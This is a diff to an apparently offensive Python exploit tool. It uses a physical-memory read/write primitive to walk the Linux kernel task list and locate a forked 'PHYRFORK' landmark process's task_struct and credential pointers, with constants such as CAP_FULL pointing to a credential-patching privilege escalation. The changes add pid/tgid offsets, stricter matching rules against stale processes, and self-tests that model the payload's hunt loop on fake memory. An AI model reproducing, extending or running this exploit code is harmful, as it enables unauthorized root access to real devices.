@@ -43,6 +43,8 @@ CAP_FULL = 0x3FFFFFFFFF
 O_TASKS = 0x23C
 O_REAL_PARENT = 0x2F0
 O_PARENT = 0x2F4
+O_PID = 0x2E8      # task_struct.pid   (v43 landmark check; same DWARF struct)
+O_TGID = 0x2EC     # task_struct.tgid
 O_REAL_CRED = 0x3F4
 O_CRED = 0x3F8
 O_COMM = 0x400
@@ -306,10 +308,14 @@ def kptr(v: int) -> bool:
 
 def plant_task(rpc: MemRPC, phys: int, comm: bytes, cred_phys: int,
                parent_phys: int | None = None,
-               real_parent_phys: int | None = None) -> int:
+               real_parent_phys: int | None = None,
+               pid: int | None = None) -> int:
     """Minimal task_struct: comm, cred, real_parent/parent. Returns virt."""
     virt = (phys + PHYS_OFF) & 0xFFFFFFFF
     rpc.write(phys + O_COMM, comm[:15] + b"\x00")
+    if pid is not None:            # v43: landmark pid check
+        rpc.write32(phys + O_PID, pid & 0xFFFFFFFF)
+        rpc.write32(phys + O_TGID, pid & 0xFFFFFFFF)
     cv = (cred_phys + PHYS_OFF) & 0xFFFFFFFF
     rpc.write32(phys + O_CRED, cv)
     rpc.write32(phys + O_REAL_CRED, cv)
@@ -416,26 +422,61 @@ def walk_prev(rpc: MemRPC, init_phys: int, init_virt: int,
         cur = rpc.read_u32(v2p(cur) + 4)
 
 
+def task_pid(rpc: MemRPC, task_virt: int) -> int:
+    """Twin of payload `TaskPid`: pid when pid == tgid and plausible, else -1.
+
+    A forked landmark is its own group leader (pid == tgid); a pthread would
+    not be, which is why both words must agree.
+    """
+    try:
+        w = rpc.read_u32(v2p(task_virt) + O_PID)
+        g = rpc.read_u32(v2p(task_virt) + O_TGID)
+    except Exception:
+        return -1
+    if w != g or w == 0 or w > 0x7FFFFFFF:
+        return -1
+    return w
+
+
 def hunt_new_phyrfork(rpc: MemRPC, init_phys: int, init_virt: int,
-                      pre: set[int] | None = None) -> tuple[int, int, int]:
+                      pre: set[int] | None = None,
+                      *, expect_tag: bytes | None = None,
+                      expect_pid: int | None = None,
+                      stats: dict | None = None) -> tuple[int, int, int]:
     """Twin of the payload hunt loop. Returns (child_virt, seen, skip_orphan).
 
-    Skips PHYRFORK already in `pre` (orphans from the last round). Last match
-    wins; a uid-5001 parent beats any other. child=0 means none.
+    v43 hardening, mirroring the payload: a new PHYRFORK task is accepted when
+    its comm equals `expect_tag` (the per-run "PHYRFORK"+hex(pid) name) or,
+    failing that, when its pid/tgid words equal `expect_pid`.  A task whose
+    pid/tgid are readable and different is a leftover landmark from an earlier
+    run and is REFUSED (counted in stats["stale"]) instead of patched.  Only a
+    task whose pid words are unreadable falls back to the legacy parent-uid
+    rule (v23: new landmark; a uid-5001 parent beats any other).
     """
     pre = pre or set()
     ours = maybe = 0
-    seen = skip = 0
+    seen = skip = stale = 0
+    how = "none"
     for task in walk_prev(rpc, init_phys, init_virt):
         nm = rpc.read(v2p(task) + O_COMM, 16)
         if nm.startswith(b"PHYRFORK") and task not in pre:
             seen += 1
             pu = child_parent_uid(rpc, task)
-            if pu == OWNER_UID:
-                ours = task
+            name = nm.split(b"\x00", 1)[0]
+            tpid = task_pid(rpc, task) if expect_pid is not None else -1
+            if expect_tag is not None and name == expect_tag:
+                ours, how = task, "exact"
+            elif tpid >= 0 and tpid == expect_pid:
+                ours, how = task, "pid"
+            elif tpid >= 0:
+                stale += 1
+            elif pu == OWNER_UID:
+                ours, how = task, "prefix"
             else:
                 skip += 1
                 maybe = task
+    if stats is not None:
+        stats.update(seen=seen, skip_orphan=skip, stale=stale, how=how)
     return (ours if ours else maybe), seen, skip
 
 
@@ -1290,6 +1331,64 @@ def selftest() -> int:
         "hunt latches a foreign-looking new landmark (v23)",
         child_f == new_v and seen_f == 1 and skip_f == 1,
         f"child={child_f:#x} new={new_v:#x} seen={seen_f} skip={skip_f}",
+    )
+
+    # v43: per-run tags.  A leftover landmark from an earlier launch carries a
+    # different pid AND a different tag, so it must be REFUSED rather than
+    # patched (the stale-task family the `pre` snapshot only papered over).
+    r43 = MemRPC()
+    ip43 = 0x20B00000
+    stale43_p, fresh43_p = 0x20B01000, 0x20B02000
+    c43 = plant_cred(r43, 0x20B03000, uid=5001, gid=100, usage=4)
+    plant_task(r43, stale43_p, b"PHYRFORK111", c43, pid=0x111)      # earlier run
+    fresh43_v = plant_task(r43, fresh43_p, b"PHYRFORK222", c43, pid=0x222)
+    iv43 = link_tasks_prev(r43, ip43, [stale43_p, fresh43_p])
+    st43: dict = {}
+    child43, _s43, _k43 = hunt_new_phyrfork(
+        r43, ip43, iv43, pre=set(),
+        expect_tag=b"PHYRFORK222", expect_pid=0x222, stats=st43)
+    failed += not _check(
+        "v43 exact per-run tag wins over an older landmark",
+        child43 == fresh43_v and st43["how"] == "exact" and st43["stale"] == 1,
+        f"child={child43:#x} fresh={fresh43_v:#x} how={st43['how']} "
+        f"stale={st43['stale']}",
+    )
+    # Tag has not landed yet but the pid words are fresh: accept on the pid.
+    r43b = MemRPC()
+    ip43b = 0x20C00000
+    old43b_p, new43b_p = 0x20C01000, 0x20C02000
+    c43b = plant_cred(r43b, 0x20C03000, uid=5001, gid=100, usage=4)
+    plant_task(r43b, old43b_p, b"PHYRFORK900", c43b, pid=0x900)
+    new43b_v = plant_task(r43b, new43b_p, b"PHYRFORK", c43b, pid=0x902)
+    iv43b = link_tasks_prev(r43b, ip43b, [old43b_p, new43b_p])
+    st43b: dict = {}
+    child43b, _s43b, _k43b = hunt_new_phyrfork(
+        r43b, ip43b, iv43b, pre=set(),
+        expect_tag=b"PHYRFORK902", expect_pid=0x902, stats=st43b)
+    failed += not _check(
+        "v43 pid/tgid check accepts a child whose tag has not landed yet",
+        child43b == new43b_v and st43b["how"] == "pid" and st43b["stale"] == 1,
+        f"child={child43b:#x} new={new43b_v:#x} how={st43b['how']} "
+        f"stale={st43b['stale']}",
+    )
+    # Unreadable pid words (a kernel where the offset does not read): the legacy
+    # parent-uid rule must still latch, or a cold boot could regress.
+    r43c = MemRPC()
+    ip43c = 0x20E00000
+    par43c_p, leg43c_p = 0x20E01000, 0x20E02000
+    c43c = plant_cred(r43c, 0x20E03000, uid=5001, gid=100, usage=4)
+    plant_task(r43c, par43c_p, b"PHYSRPT777", c43c)
+    leg43c_v = plant_task(r43c, leg43c_p, b"PHYRFORK", c43c,
+                          parent_phys=par43c_p)
+    iv43c = link_tasks_prev(r43c, ip43c, [leg43c_p])
+    st43c: dict = {}
+    child43c, _s43c, _k43c = hunt_new_phyrfork(
+        r43c, ip43c, iv43c, pre=set(),
+        expect_tag=b"PHYRFORK777", expect_pid=777, stats=st43c)
+    failed += not _check(
+        "v43 falls back to the legacy parent-uid latch when pid is unreadable",
+        child43c == leg43c_v and st43c["how"] == "prefix",
+        f"child={child43c:#x} legacy={leg43c_v:#x} how={st43c['how']}",
     )
 
     # v17 cache alias: write is visible in the mapping, kernel RAM is not,
